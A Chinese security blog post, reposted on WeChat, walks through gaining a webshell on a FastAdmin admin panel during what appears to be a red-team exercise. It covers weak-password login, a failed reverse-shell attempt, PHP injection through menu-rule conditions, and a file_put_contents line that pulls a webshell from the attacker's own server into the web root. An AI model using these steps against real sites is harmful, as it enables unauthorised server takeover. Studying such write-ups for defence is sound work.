#  记一次FastAdmin后台Getshell

culprit  [ 橘猫学安全 ](javascript:void\(0\);)

**橘猫学安全** ![]()

微信号 gh_af700ee13397

功能介绍 每日一干货🙂

____

___发表于_

收录于合集 #网络安全技术 211个

FastAdmin介绍  
  
FastAdmin是基于ThinkPHP5和Bootstrap的极速后台开发框架，基于ThinkPHP行为功能实现的插件机制，拥有丰富的插件和扩展，可直接在线安装卸载。基于完善的Auth权限控制管理、无限父子级权限分组、可自由分配子级权限、一个管理员可同时属于多个组别。  
测试过程  
  
在某次HVV的打点过程中，发现某资产为FastAdmin搭建。下图为FastAdmin的报错页面，根据经验可判断该网站为FastAdmin搭建。![]()  
输入admin.php进入后台登录页面，弱口令进入后台。![]()![]()  
进入后台找功能点getshell。后台默认会有插件管理功能，但是我们在后台没有找到这个功能，我们直接访问插件管理的地址

  * 

    
    
    /admin/addon?ref=addtabs

![]()  
理论上离线安装 Fileix文件管理器 ，然后上传一句话木马就可以getshell，但是很可惜失败了。![]()  
接着翻后台，发现有定时任务功能，尝试反弹shell，写入反弹shell的语句后，在服务器上nc监听等待回连，但是发现并没有执行。![]()  
后面一看之前管理员设置过的定时任务也没有执行过，失败！![]()  
继续翻后台，发现在菜单规则中可以创建规则条件，尝试在功能点中写入phpinfo()。必须写在权限管理中！！！![]()  
然后来到管理员管理中，添加一个管理员。所属组别必须为二级管理员组！！！![]()  
添加完成之后，重新用新添加的账户登录后台，可以发现phpinfo()被成功执行。![]()  
通过搜索$_SERVER[‘DOCUMENT_ROOT’]获取网站根目录，为/www/wwwroot/xxxxxxxxx/![]()  
找到根路径后注销账户，准备一个webshell木马名为1.php，放在自己的服务器上，使用python启动一个临时web。

  * 

    
    
    python3 -m http.server 8080

![]()  
在回到管理后台当中，在同样的位置写入如下语句，将远程服务器的webshell木马下载到网站根目录。

  * 

    
    
    file_put_contents('/www/wwwroot/xxxxxxxxx/shell.php',file_get_contents('临时web地址/1.php'))

![]()  
保存完成后，再次使用刚才新创建的用户登录![]()![]()  
webshell木马已被成功写入。![]()  
总结  
  
在打点过程中， 通过指纹识别软件进行指纹识别进行相应的漏洞利用，在未识别出指纹的需人工判断，根据报错页面的样式识别指纹一种较好的方法。  
  
整体打点过程：浏览网站—>发现报错页面指纹为FastAdmin—>通过弱口令进入后台—>规则条件中写入phpinfo()—>获得网站根目录—>规则条件中写入webshell。  

  *   * 

    
    
    文章来源：culprit（语雀）原文地址：https://www.yuque.com/culprit/note/nyvtuz

  
如有侵权，请联系删除

 **推荐阅读**

[实战|记一次奇妙的文件上传getshell](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495718&idx=1&sn=e25bcb693e5a50988f4a7ccd4552c2e2&chksm=c04d7718f73afe0e282c778af8587446ff48cd88422701126b0b21fa7f5027c3cde89e0c3d6d&scene=21#wechat_redirect)  
[「 超详细 | 分享
」手把手教你如何进行内网渗透](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495694&idx=1&sn=502c812024302566881bad63e01e98cb&chksm=c04d7730f73afe267fd4ef57fb3c74416b20db0ba8e6b03f0c1fd7785348860ccafc15404f24&scene=21#wechat_redirect)  
[神兵利器 | siusiu-
渗透工具管理套件](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495385&idx=1&sn=4d2d8456c27e058a30b147cb7ed51ab1&chksm=c04d69e7f73ae0f11b382cddddb4a07828524a53c0c2987d572967371470a48ad82ae96e7eb1&scene=21#wechat_redirect)  
[一款功能全面的XSS扫描器](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495361&idx=1&sn=26077792908952c6279deeb2a19ebe37&chksm=c04d69fff73ae0e9f2e03dd8e347f35d660a7fd3d51b0f5e45c8c64afc90c0ee34c4251f9c80&scene=21#wechat_redirect)  
[实战 |
一次利用哥斯拉马绕过宝塔waf](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495331&idx=1&sn=94b63a0ec82de62191f0911a39b63b7a&chksm=c04d699df73ae08b946e4cf53ceea1bc7591dad0ce18a7ccffed33aa52adccb18b4b1aa78f4c&scene=21#wechat_redirect)  
[BurpCrypto:
万能网站密码爆破测试工具](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495253&idx=1&sn=d4c46484a44892ef7235342d2763e6be&chksm=c04d696bf73ae07d0c16cff3317f6eb847df2251a9f2332bbe7de56cb92da53b206cd4100210&scene=21#wechat_redirect)  
[快速筛选真实IP并整理为C段 --
棱眼](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495199&idx=1&sn=74c00ba76f4f6726107e2820daf7817a&chksm=c04d6921f73ae037efe92e051ac3978068d29e76b09cf5b0b501452693984f96baa9436457e4&scene=21#wechat_redirect)  
[自动探测端口顺便爆破工具t14m4t](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495141&idx=1&sn=084e8231c0495e91d1bd841e3f43b61c&chksm=c04d6adbf73ae3cdbb0a4cc754f78228772d6899b94d0ea6bb735b4b5ca03c51e7715b43d0af&scene=21#wechat_redirect)  
[渗透工具｜无状态子域名爆破工具（1秒扫160万个子域）](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495099&idx=1&sn=385764328aff5ec49acddab380721af0&chksm=c04d6a85f73ae393ffab22021839f5baec3802d495c34fb364cbdd9b7cb0cf642851e9527ba7&scene=21#wechat_redirect)  
 **查看更多精彩内容，还请关注** **橘猫学安全：** **每日坚持学习与分享，觉得文章对你有帮助可在底部给点个“** **再看 ”**

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

